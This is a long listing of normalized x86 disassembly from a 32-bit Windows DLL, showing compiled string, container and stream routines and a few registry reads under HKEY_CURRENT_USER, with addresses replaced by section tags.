mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_100021a7
call sub_1002b37e
retn 0x8
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1000218b
add esp 0x10
sub_1000205b
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10001fb6
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_100020e2
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_100021a7
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_100272e8
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x10
push eax
call sub_1000218b
add esp 0x10
sub_1000212d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_10021cc4
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_10002000
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_100021a7
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_100020e2
jmp r-xdata
mov eax edi
sub_100021c3
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_10021cfc
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_1000212d
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10001f47
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10001f47
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
add edi edx
push edi
push ecx
push eax
call sub_1000218b
add esp 0x10
push esi
mov ecx ebx
call sub_100021a7
sub_10002255
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_100021a7
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_100021c3
mov eax esi
pop esi
retn 0x4
sub_100022bb
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_10021cfc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp + 0x8 ] edx
mov ebx [ edx ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
sub eax ebx
push eax
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x4 ]
sub ecx edi
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_1000229a
mov eax [ esi + 0x14 ]
add esp 0x10
sub eax ebx
push eax
mov ecx esi
call sub_10002630
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_10002399
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_1002738b
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10027401
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1002ae74
int3
sub_100023e6
push 0xc
mov eax sub_1004fcfa
call sub_1002b2d9
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_10002399
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_1000264e
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_10002630
call sub_1002b37e
retn 0x8
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_10002614
add esp 0x10
sub_10002446
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10002399
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_100024cd
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_10021cc4
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_100023e6
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_10002630
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_1000264e
jmp r-xdata
mov eax edi
sub_1000253c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_10021cfc
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_100024cd
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_100022bb
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_100022bb
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
lea edx [ edi + edx * 2 ]
push edx
push ecx
push eax
call sub_10002614
add esp 0x10
push esi
mov ecx ebx
call sub_10002630
sub_100025cf
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002630
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_1000253c
mov eax esi
pop esi
retn 0x4
sub_1000264e
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_10002630
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_100272e8
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x8
push eax
call sub_10002614
add esp 0x10
sub_100026a3
push 0x0
mov eax sub_100505ec
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
push esi
call sub_10002f1b
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
call sub_10001bdf
lea ecx [ esi + 0x38 ]
call sub_100082a7
lea ecx [ esi + 0x54 ]
call sub_100082a7
lea eax [ esi + 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10002f1b
lea ecx [ esi + 0x88 ]
call sub_100082a7
mov eax esi
call sub_1002b37e
retn 0x4
sub_100026f6
push esi
push 0x0
push 0x1
lea ecx [ edi + 0x88 ]
call sub_100020e2
lea esi [ edi + 0x70 ]
call sub_100015ca
push [ esi ]
call sub_100272e8
pop ecx
push 0x0
push 0x1
lea ecx [ edi + 0x54 ]
call sub_100020e2
push 0x0
push 0x1
lea ecx [ edi + 0x38 ]
call sub_100020e2
push 0x0
push 0x1
lea ecx [ edi + 0x18 ]
call sub_1000264e
mov esi edi
call sub_100015ca
push [ edi ]
call sub_100272e8
pop ecx
pop esi
retn
sub_1000274b
push 0xa8
mov eax sub_100521d8
call sub_1002b30f
lea eax [ ebp - 0xb4 ]
push eax
mov edi ecx
call sub_100026a3
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb4 ]
call sub_100027af
lea eax [ ebp - 0xb4 ]
call sub_10002b8d
lea edi [ ebp - 0xb4 ]
call sub_100026f6
call sub_1002b392
retn
sub_100027af
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005219f
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd8 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi r--data
push esi
lea ecx [ esp + 0x30 ]
call sub_10001362
xor ebx ebx
push r--data
lea ecx [ esp + 0x4c ]
mov [ esp + 0xe4 ] ebx
call sub_10001362
lea eax [ esp + 0x2c ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x80000001
lea eax [ esp + 0xb4 ]
push eax
mov [ esp + 0xf0 ] 0x1
call sub_10014a6c
push ebx
push 0x1
lea ecx [ esp + 0x50 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esp + 0x34 ]
mov [ esp + 0xe8 ] 0x4
call sub_1000264e
push esi
lea ecx [ esp + 0x14 ]
call sub_10001362
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x84 ]
push eax
lea eax [ esp + 0xb0 ]
push eax
mov [ esp + 0xec ] 0x5
call sub_10014b9d
push ebx
push 0x1
lea ecx [ esp + 0x18 ]
mov [ esp + 0xe8 ] 0x7
call sub_1000264e
lea eax [ esp + 0x64 ]
push eax
lea eax [ esp + 0x84 ]
push eax
call sub_100150f9
mov ecx eax
mov [ esp + 0xe0 ] 0x8
call sub_1000290c
push ebx
push 0x1
lea ecx [ esp + 0x6c ]
call sub_1000264e
lea esi [ esp + 0x80 ]
mov [ esp + 0xe0 ] 0x4
call sub_100150b1
lea ecx [ esp + 0xa8 ]
call sub_10014b74
mov ecx [ esp + 0xd8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc0 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
sub_1000290c
push 0x10c
mov eax sub_1005213e
call sub_1002b30f
lea eax [ ebp - 0x118 ]
push eax
call sub_100031a2
push 0x7
pop esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] esi
call sub_10002630
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_10002630
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000622b
pop ecx
pop ecx
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007e38
mov esi eax
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10009d44
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x90 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006383
push 0xffffffff
push ebx
push eax
lea ecx [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x3
call sub_100021c3
push ebx
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100020e2
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call sub_1000622b
pop ecx
pop ecx
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e38
mov esi eax
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10009d44
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x90 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006383
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x4
push eax
lea ecx [ edi + 0x54 ]
call sub_100021c3
push ebx
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100020e2
lea eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call sub_10002e24
lea eax [ edi + 0x18 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call sub_1000622b
pop ecx
pop ecx
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
mov [ ebp - 0x70 ] ebx
call sub_10002d09
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push r--data
call sub_10001362
push [ ebp - 0x70 ]
mov ecx edi
call sub_10003078
cmp [ ebp - 0x70 ] ebx
mov [ ebp - 0x68 ] ebx
jle r-xdata
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_10002d09
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x70 ] esp
push r--data
call sub_10001362
push [ ebp - 0x68 ]
lea esi [ edi + 0x70 ]
mov ecx esi
call sub_10003078
cmp [ ebp - 0x68 ] ebx
mov [ ebp - 0x70 ] ebx
jle r-xdata
push [ ebp - 0x68 ]
mov esi edi
call sub_10003116
push eax
lea eax [ ebp - 0x118 ]
push eax
call sub_1000622b
inc [ ebp - 0x68 ]
mov eax [ ebp - 0x68 ]
cmp eax [ ebp - 0x70 ]
pop ecx
pop ecx
jl r-xdata
push ebx
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4c ] 0x7
call sub_10002630
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1000622b
pop ecx
pop ecx
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10007e38
mov esi eax
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10009d44
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x90 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006383
push 0xffffffff
push ebx
push eax
lea ecx [ edi + 0x88 ]
mov [ ebp - 0x4 ] 0x6
call sub_100021c3
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x90 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x64 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x48 ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x118 ]
call sub_10002793
call sub_1002b392
retn
push [ ebp - 0x70 ]
call sub_10003116
push eax
lea eax [ ebp - 0x118 ]
push eax
call sub_1000622b
inc [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
cmp eax [ ebp - 0x68 ]
pop ecx
pop ecx
jl r-xdata
sub_10002b8d
push esi
mov esi eax
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push ebx
push ebp
lea ebx [ esi + 0x54 ]
mov ebp r--data
push ebp
mov ecx ebx
call sub_10006f6f
test eax eax
je r-xdata
mov [ edi + 0x34 ] eax
lea ebx [ esi + 0x38 ]
push ebp
mov ecx ebx
call sub_10006f6f
test eax eax
je r-xdata
push 0xffffffff
push 0x0
push ebx
lea ecx [ edi + 0x54 ]
call sub_100021c3
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jbe r-xdata
push 0xffffffff
push 0x0
push ebx
lea ecx [ edi + 0x38 ]
call sub_100021c3
lea ebx [ esi + 0x70 ]
mov eax [ ebx + 0x10 ]
sub eax [ ebx + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jbe r-xdata
mov eax esi
mov ecx edi
call sub_10002f58
add esi 0x88
push ebp
mov ecx esi
call sub_10006f6f
pop ebp
pop ebx
test eax eax
je r-xdata
lea ecx [ edi + 0x70 ]
mov eax ebx
call sub_10002f58
pop esi
retn
push 0xffffffff
push 0x0
push esi
lea ecx [ edi + 0x88 ]
call sub_100021c3
sub_10002c35
push 0x88
mov eax sub_10052998
call sub_1002b345
mov edi ecx
mov esi r--data
xor ebx ebx
push esi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] ebx
call sub_10001362
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001362
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x94 ]
push eax
push 0x80000001
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
push ebx
push 0x1
lea ecx [ ebp - 0x94 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
push esi
lea ecx [ ebp - 0x78 ]
call sub_10001362
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10014fe0
push ebx
cmp al bl
push 0x1
lea ecx [ ebp - 0x78 ]
sete [ ebp - 0x3d ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
cmp [ ebp - 0x3d ] bl
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10014b74
call sub_1002b3a1
retn
mov ecx edi
call sub_1000274b
sub_10002d09
push 0x2c
mov eax sub_100520df
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_10007d03
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ esi ]
mov [ ebp - 0x1c ] ebx
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000644e
pop ecx
lea ecx [ ebp - 0x20 ]
mov edi eax
call sub_10007dbd
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
cmp ecx ebx
lea ebx [ ebp - 0x1c ]
push ebx
lea ebx [ ebp - 0x18 ]
push ebx
push eax
sete dl
mov [ ebp - 0x2c ] 0x1
push [ ebp - 0x2c ]
xor eax eax
push eax
mov [ ebp - 0x34 ] dl
push [ ebp - 0x34 ]
mov edx [ edi ]
push ecx
lea eax [ ebp - 0x38 ]
push eax
mov ecx edi
call [ edx + 0x20 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x18 ]
call sub_100081bf
test [ ebp - 0x18 ] 0x2
jne r-xdata
mov eax esi
call sub_1002b37e
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_10021d73
or [ ebp - 0x18 ] 0x2
mov eax [ ebp - 0x1c ]
lea ecx [ eax - 0x80000000 ]
cmp ecx 0xffffffff
ja r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
jmp r-xdata
sub_10002d9a
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10002e24
push 0x24
mov eax sub_100520b4
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007d03
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000644e
pop ecx
lea ecx [ ebp - 0x18 ]
mov edi eax
call sub_10007dbd
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
cmp ecx ebx
lea ebx [ ebp - 0x14 ]
push ebx
push eax
sete dl
mov [ ebp - 0x24 ] 0x1
push [ ebp - 0x24 ]
xor eax eax
push eax
mov [ ebp - 0x2c ] dl
push [ ebp - 0x2c ]
mov edx [ edi ]
push ecx
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call [ edx + 0x24 ]
and [ ebp - 0x4 ] 0x0
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
push 0x0
push [ ebp - 0x14 ]
call sub_100081bf
mov eax esi
call sub_1002b37e
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_10021d73
sub_10002eb0
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10002f1b
push 0x0
mov eax sub_100505a8
call sub_1002b2a6
mov esi [ esp + 0x24 ]
push 0x0
push 0x1
call sub_10001bf4
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
mov eax esi
call sub_1002b37e
retn 0x4
sub_10002f58
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov esi eax
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
push ebx
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ edi + 0xc ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx eax
cmp [ ebp - 0x4 ] ecx
ja r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x8 ]
call sub_1000986e
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_1000986e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push eax
push edi
call sub_10003865
jmp r-xdata
test ebx ebx
jne r-xdata
push [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov eax ebx
call sub_100064eb
pop ecx
push [ edi + 0x10 ]
call sub_100139b7
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
imul eax eax 0x1c
add eax [ edi + 0xc ]
jmp r-xdata
pop ebx
mov eax [ edi + 0x14 ]
sub eax ebx
push 0x1c
cdq
pop ebx
idiv ebx
xor eax eax
jmp r-xdata
mov [ edi + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
imul ecx ecx 0x1c
add ecx edx
mov ebx ecx
push ebx
mov ecx edx
call sub_100064eb
pop ecx
push [ edi + 0x10 ]
mov ecx ebx
jmp r-xdata
cmp [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
ja r-xdata
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
xor ecx ecx
mov [ edi + 0xc ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] ecx
cmp eax ecx
je r-xdata
push [ edi + 0x10 ]
call sub_100139b7
push [ edi + 0xc ]
call sub_100272e8
pop ecx
push [ esi + 0x10 ]
call sub_10006529
call sub_10001593
test al al
je r-xdata
push [ edi + 0xc ]
mov ecx [ esi + 0xc ]
sub_10003078
push 0x1c
mov eax sub_1005123f
call sub_1002b2a6
mov edi ecx
and [ ebp - 0x4 ] 0x0
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax [ edi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp + 0x8 ] eax
jbe r-xdata
jae r-xdata
lea esi [ ebp - 0x18 ]
call sub_1000986e
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push [ ebp - 0x18 ]
push eax
mov eax [ edi + 0x10 ]
sub eax [ edi + 0xc ]
push 0x1c
pop ecx
cdq
idiv ecx
mov ecx [ ebp + 0x8 ]
sub ecx eax
push ecx
mov ecx edi
call sub_100016db
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_1000264e
call sub_1002b37e
retn 0x20
lea esi [ ebp - 0x18 ]
call sub_1000986e
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_1000986e
push [ ebp + 0x8 ]
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_10001946
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
push edi
call sub_10003865
sub_10003116
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ esp + 0x4 ] eax
jb r-xdata
mov eax [ esp + 0x4 ]
imul eax eax 0x1c
add eax [ esi + 0xc ]
retn 0x4
call sub_10027827
sub_1000313a
push 0x8
mov eax sub_100515e1
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
xor ebx ebx
push edi
inc ebx
push esi
mov [ ebp - 0x10 ] ebx
call sub_100038bd
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_100049ac
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
sub_100031a2
push 0x8
mov eax sub_100515e1
call sub_1002b2a6
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0xc ]
xor esi esi
push eax
inc esi
push edi
mov [ ebp - 0x10 ] esi
call sub_100038bd
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
